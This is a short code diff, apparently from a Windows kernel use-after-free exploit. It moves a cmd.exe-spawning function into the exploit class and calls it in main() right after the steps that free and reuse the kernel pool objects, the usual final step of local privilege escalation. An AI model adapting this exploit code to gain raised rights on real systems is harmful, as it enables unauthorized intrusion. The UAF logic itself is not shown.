@@ -185,19 +185,21 @@ public:
 
 		return handle;
 	}
+
+	auto createCmdShell() -> void {
+		STARTUPINFO si = { sizeof(si) };
+		PROCESS_INFORMATION pi = { 0 };
+		si.dwFlags = STARTF_USESHOWWINDOW;
+		si.wShowWindow = SW_SHOW;
+		WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
+		BOOL bReturn = CreateProcessW(nullptr, wzFilePath, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr,
+			nullptr, (LPSTARTUPINFOW)&si, &pi);
+
+		if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
+	}
 };
 
-auto createCmdShell() -> void {
-	STARTUPINFO si = { sizeof(si) };
-	PROCESS_INFORMATION pi = { 0 };
-	si.dwFlags = STARTF_USESHOWWINDOW;
-	si.wShowWindow = SW_SHOW;
-	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
-	BOOL bReturn = CreateProcessW(nullptr, wzFilePath, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr,
-		nullptr, (LPSTARTUPINFOW)&si, &pi);
 
-	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
-}
 
 
 int main(int argc, char* argv[]) {
@@ -213,7 +215,7 @@ int main(int argc, char* argv[]) {
 	uaf.freeObjectsNonPagedPool();
 	uaf.useUAFObject();
 
-	createCmdShell();
+	uaf.createCmdShell();
 
 	return 0;
 }
